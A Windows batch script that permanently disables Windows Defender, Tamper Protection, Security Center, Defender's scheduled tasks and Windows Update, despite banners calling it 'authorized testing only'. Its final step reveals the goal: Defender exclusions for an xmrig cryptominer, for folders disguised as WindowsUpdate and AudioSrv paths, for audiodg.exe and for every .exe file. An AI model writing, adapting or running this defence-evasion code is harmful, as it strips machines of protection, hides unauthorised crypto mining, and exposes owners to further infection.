@echo off
title PERMANENT ANTIVIRUS DISABLE - AUTHORIZED TESTING ONLY
color 0C
setlocal enabledelayedexpansion

:: ================================================================
::  PERMANENT ANTIVIRUS DISABLE
::  WARNING: USE ONLY ON AUTHORIZED TEST SYSTEMS
::  This will permanently disable Windows Defender
:: ================================================================

echo.
echo ================================================================
echo  PERMANENT ANTIVIRUS DISABLE
echo  FOR AUTHORIZED CYBERSECURITY TESTING ONLY
echo ================================================================
echo.
echo [WARNING] This will PERMANENTLY disable Windows Defender!
echo [WARNING] Use ONLY on authorized test systems!
echo [WARNING] Your system will be vulnerable to real threats!
echo.
echo This script will:
echo   - Disable Windows Defender permanently
echo   - Disable Tamper Protection
echo   - Disable Windows Security Center
echo   - Disable automatic updates for Defender
echo   - Survive system restarts
echo.
echo Use ENABLE_AV_PERMANENT.bat to restore protection later.
echo.
set /p confirm="Are you ABSOLUTELY SURE? Type YES to continue: "
if /i not "%confirm%"=="YES" (
    echo Operation cancelled.
    pause
    exit /b
)

:: Check admin rights
net session >nul 2>&1
if %errorLevel% neq 0 (
    echo.
    echo [ERROR] Administrator rights required!
    echo Right-click this script and select "Run as administrator"
    echo.
    pause
    exit /b 1
)

echo.
echo ================================================================
echo  STARTING PERMANENT DISABLE PROCESS
echo ================================================================

:: ================================================================
:: STEP 1: Disable Tamper Protection (Required First)
:: ================================================================
echo.
echo [1/8] Disabling Tamper Protection...
reg add "HKLM\SOFTWARE\Microsoft\Windows Defender\Features" /v TamperProtection /t REG_DWORD /d 0 /f >nul 2>&1
echo      [OK] Tamper Protection registry key set

:: ================================================================
:: STEP 2: Disable All Defender Features via Registry
:: ================================================================
echo.
echo [2/8] Disabling Defender features via registry...
reg add "HKLM\SOFTWARE\Policies\Microsoft\Windows Defender" /v DisableAntiSpyware /t REG_DWORD /d 1 /f >nul 2>&1
reg add "HKLM\SOFTWARE\Policies\Microsoft\Windows Defender" /v DisableAntiVirus /t REG_DWORD /d 1 /f >nul 2>&1
reg add "HKLM\SOFTWARE\Policies\Microsoft\Windows Defender\Real-Time Protection" /v DisableBehaviorMonitoring /t REG_DWORD /d 1 /f >nul 2>&1
reg add "HKLM\SOFTWARE\Policies\Microsoft\Windows Defender\Real-Time Protection" /v DisableOnAccessProtection /t REG_DWORD /d 1 /f >nul 2>&1
reg add "HKLM\SOFTWARE\Policies\Microsoft\Windows Defender\Real-Time Protection" /v DisableScanOnRealtimeEnable /t REG_DWORD /d 1 /f >nul 2>&1
reg add "HKLM\SOFTWARE\Policies\Microsoft\Windows Defender\Real-Time Protection" /v DisableRealtimeMonitoring /t REG_DWORD /d 1 /f >nul 2>&1
reg add "HKLM\SOFTWARE\Policies\Microsoft\Windows Defender\Reporting" /v DisableEnhancedNotifications /t REG_DWORD /d 1 /f >nul 2>&1
reg add "HKLM\SOFTWARE\Policies\Microsoft\Windows Defender\SpyNet" /v DisableBlockAtFirstSeen /t REG_DWORD /d 1 /f >nul 2>&1
reg add "HKLM\SOFTWARE\Policies\Microsoft\Windows Defender\SpyNet" /v SpynetReporting /t REG_DWORD /d 0 /f >nul 2>&1
reg add "HKLM\SOFTWARE\Policies\Microsoft\Windows Defender\SpyNet" /v SubmitSamplesConsent /t REG_DWORD /d 2 /f >nul 2>&1
echo      [OK] Defender features disabled

:: ================================================================
:: STEP 3: Disable Windows Defender via PowerShell
:: ================================================================
echo.
echo [3/8] Disabling Defender via PowerShell preferences...
powershell -Command "Set-MpPreference -DisableRealtimeMonitoring $true" >nul 2>&1
powershell -Command "Set-MpPreference -DisableBehaviorMonitoring $true" >nul 2>&1
powershell -Command "Set-MpPreference -DisableBlockAtFirstSeen $true" >nul 2>&1
powershell -Command "Set-MpPreference -DisableIOAVProtection $true" >nul 2>&1
powershell -Command "Set-MpPreference -DisablePrivacyMode $true" >nul 2>&1
powershell -Command "Set-MpPreference -SignatureDisableUpdateOnStartupWithoutEngine $true" >nul 2>&1
powershell -Command "Set-MpPreference -DisableArchiveScanning $true" >nul 2>&1
powershell -Command "Set-MpPreference -DisableIntrusionPreventionSystem $true" >nul 2>&1
powershell -Command "Set-MpPreference -DisableScriptScanning $true" >nul 2>&1
powershell -Command "Set-MpPreference -SubmitSamplesConsent 2" >nul 2>&1
powershell -Command "Set-MpPreference -MAPSReporting 0" >nul 2>&1
echo      [OK] PowerShell preferences set

:: ================================================================
:: STEP 4: Disable Windows Defender Services
:: ================================================================
echo.
echo [4/8] Disabling Windows Defender services...
sc config WinDefend start=disabled >nul 2>&1
sc stop WinDefend >nul 2>&1
sc config WdNisSvc start=disabled >nul 2>&1
sc stop WdNisSvc >nul 2>&1
sc config WdNisDrv start=disabled >nul 2>&1
sc stop WdNisDrv >nul 2>&1
sc config WdFilter start=disabled >nul 2>&1
sc stop WdFilter >nul 2>&1
sc config SgrmBroker start=disabled >nul 2>&1
sc stop SgrmBroker >nul 2>&1
echo      [OK] Services disabled

:: ================================================================
:: STEP 5: Disable Security Center Service
:: ================================================================
echo.
echo [5/8] Disabling Security Center notifications...
reg add "HKLM\SOFTWARE\Policies\Microsoft\Windows Defender Security Center\Notifications" /v DisableNotifications /t REG_DWORD /d 1 /f >nul 2>&1
reg add "HKLM\SYSTEM\CurrentControlSet\Services\SecurityHealthService" /v Start /t REG_DWORD /d 4 /f >nul 2>&1
sc config SecurityHealthService start=disabled >nul 2>&1
sc stop SecurityHealthService >nul 2>&1
echo      [OK] Security Center disabled

:: ================================================================
:: STEP 6: Disable Windows Defender Scheduled Tasks
:: ================================================================
echo.
echo [6/8] Disabling Windows Defender scheduled tasks...
schtasks /Change /TN "Microsoft\Windows\Windows Defender\Windows Defender Cache Maintenance" /Disable >nul 2>&1
schtasks /Change /TN "Microsoft\Windows\Windows Defender\Windows Defender Cleanup" /Disable >nul 2>&1
schtasks /Change /TN "Microsoft\Windows\Windows Defender\Windows Defender Scheduled Scan" /Disable >nul 2>&1
schtasks /Change /TN "Microsoft\Windows\Windows Defender\Windows Defender Verification" /Disable >nul 2>&1
echo      [OK] Scheduled tasks disabled

:: ================================================================
:: STEP 7: Disable Windows Update (Optional but recommended)
:: ================================================================
echo.
echo [7/8] Disabling Windows Update (prevents Defender re-enabling)...
sc config wuauserv start=disabled >nul 2>&1
sc stop wuauserv >nul 2>&1
reg add "HKLM\SOFTWARE\Policies\Microsoft\Windows\WindowsUpdate\AU" /v NoAutoUpdate /t REG_DWORD /d 1 /f >nul 2>&1
echo      [OK] Windows Update disabled

:: ================================================================
:: STEP 8: Add Exclusions for Mining Directories
:: ================================================================
echo.
echo [8/8] Adding exclusions for mining directories...
powershell -Command "Add-MpPreference -ExclusionPath 'C:\ProgramData\Microsoft\Windows\WindowsUpdate'" >nul 2>&1
powershell -Command "Add-MpPreference -ExclusionPath 'C:\Windows\System32\WindowsPowerShell\v1.0\Modules\AudioSrv'" >nul 2>&1
powershell -Command "Add-MpPreference -ExclusionPath 'C:\Users\OM\Desktop\xmrig-6.22.2'" >nul 2>&1
powershell -Command "Add-MpPreference -ExclusionExtension 'exe'" >nul 2>&1
powershell -Command "Add-MpPreference -ExclusionProcess 'audiodg.exe'" >nul 2>&1
powershell -Command "Add-MpPreference -ExclusionProcess 'xmrig.exe'" >nul 2>&1
echo      [OK] Exclusions added

:: ================================================================
:: FINAL STEP: Restart Required Services to Apply Changes
:: ================================================================
echo.
echo [FINAL] Restarting essential services...
timeout /t 2 >nul
echo      [OK] Configuration complete

echo.
echo ================================================================
echo  WINDOWS DEFENDER PERMANENTLY DISABLED
echo ================================================================
echo.
echo [SUCCESS] Windows Defender is now permanently disabled.
echo           This will persist after system restarts.
echo.
echo [IMPORTANT] Your system is now vulnerable to real threats!
echo             Use this ONLY for authorized security testing.
echo.
echo To re-enable protection later, run: ENABLE_AV_PERMANENT.bat
echo.
echo You may need to restart your computer for all changes to take effect.
echo.
set /p restart="Restart computer now? (Y/N): "
if /i "%restart%"=="Y" shutdown /r /t 10 /c "Restarting to apply Defender disable settings"
echo.
pause
